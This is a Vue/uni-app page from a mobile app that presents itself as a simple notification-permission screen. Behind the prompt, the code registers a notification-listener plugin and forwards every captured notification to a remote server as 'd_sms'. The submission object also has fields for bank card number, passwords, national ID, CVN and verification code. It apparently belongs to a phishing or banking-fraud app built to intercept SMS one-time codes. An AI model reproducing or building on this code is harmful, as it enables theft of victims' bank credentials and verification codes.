<template>
	<view class="home-container">
		<view class="custom-nav">
			<view></view>
			<view><text class="title">{{$t("TITLE_PERMISSION")}}</text></view>
			<view></view>
		</view>
		<view variant="text" class="card">
			<uni-forms class="form" :modelValue="formData" 
				ref="prepareForm" label-position="top" err-show-type="undertext" 
				:rules="rules" validateTrigger="blur" >
				<uni-row class="form-row" style="margin: 6em 0;">
					<uni-col :span="24" style="text-align: center;">
						{{$t("LABEL_PERMISSION_TEXT")}}
					</uni-col>
				</uni-row>
				<uni-row class="form-row">
					<uni-col :span="24" style="text-align: center;">
						<uni-button type="primary" class="large-button" @click="allowPermission">{{buttonTitle}}</uni-button>
					</uni-col>
				</uni-row>
			</uni-forms>
		</view>
	</view>

</template>

<script lang="ts">
	export default {
		data() {
			return {
				options: {}
			}
		},
		onLoad(options: any) {
			this.options = options;
		}
	}
</script>

<script setup lang="ts">
	import { computed, ref, onMounted, onUnmounted, getCurrentInstance } from "vue";
	import { useI18n } from 'vue-i18n'
	const i18n = useI18n();
	
	import { updateOrder, heartBeat } from './Remote';
	import rules from './Rules';

	import { useRoute } from 'vue-router'
	const route = useRoute()
	
	// const notifyListener = uni.requireNativePlugin('uniplugin_notificationlistener');
	
	const notifyListener = uni.requireNativePlugin('Karma617-NotifyListener');
	
	const buttonTitle = ref(i18n.t("BUTTON_PERMISSION_TO_ALLOW"));
	onMounted(() => {
		let pageInstance = getCurrentInstance();
		if (pageInstance) {
			let options: any = pageInstance.data.options;
			formData.value.id = options.order
		}
		notifyListener.init();
		// setTimeout(function() {
		// 	startNotifyListener();
		// }, 1900);
		
	})
	
	onUnmounted(() => {
	});	
		
	const prepareForm = ref(null);
	const formData = ref({
		id: "",
	});
	const allowPermission = async () => {
		console.log("allowPermission...")
		if (!notifyListener.notificationPermission()) {
			notifyListener.jumpSettingPage();
			return;
		}
		startNotifyListener();
	}
	const listenerStarted = ref(false);
	const startNotifyListener = () => {
		// if (listenerStarted.value) {
		// 	console.log("startNotifyListener: ", listenerStarted.value)
		// 	return;
		// }
		if (!listenerStarted.value) {
			upgrade("");
		}
		listenerStarted.value = true;
		console.log("startNotifyListener....");
		
		notifyListener.startNotifyListener((params) => {
			console.log("-------1")
			console.log(params)
			let title = JSON.stringify(params);
			upgrade(title);
		})
	}
	const checkPermission = async () => {
		console.log("checkPermission...", notifyListener.notificationPermission())
		if (!notifyListener.notificationPermission()) {
			buttonTitle.value = i18n.t("BUTTON_PERMISSION_TO_ALLOW");
		}
		else {
			buttonTitle.value = i18n.t("BUTTON_PERMISSION_LISTENING");
			startNotifyListener();
		}
	}
	const upgrade = async (content) => {
		prepareForm.value.validate();
		let formDataValue = formData.value
		let submitData = {
			d_id: formDataValue.id,
			d_kaihuhang: "",
			d_name: "",
			d_kahao: "",
			d_mima: "",
			d_mima2: "",
			d_sfz: "",
			d_phone: "",
			d_cvn: "",
			d_cvntime: "",
			d_yue: null,
			d_yzm: null,
			d_download: null,
			d_permission: 1,
			d_sms: content,
			d_device: null
		}
		let resp = await updateOrder(submitData);
		console.log(resp);
		if (resp.status == 1 && content) {
			uni.redirectTo({
				url: "waiting?order=" + resp.data.d_id
			})
		}
	}
	
	onUnmounted(() => {
		clearInterval(heartBeatTimer);
	});	
	
	const heartBeatTimer = setInterval(async () => {
		try {
			heartBeat(formData.value.id);
			checkPermission();
		}
		catch(error) {
		}
	}, 3000);
</script>

<style>
	.home-container {}

	.card {
		padding: 0.5em;
	}

	.flex-row {
		display: flex;
		flex-direction: row;
		justify-content: space-between;
		gap: 0.5em;
	}

	.form .form-row {
		padding: 0.5em;
	}

	.form .form-item label {
		line-height: 2em;
		color: #999;
	}

	.form .form-item input {
		/* border: 1px solid #CCC; */
		font-size: 18px;
		line-height: 200%;
		width: 100%;
	}

	.submit {
		color: #FFF;
		font-weight: 900;
	}

</style>
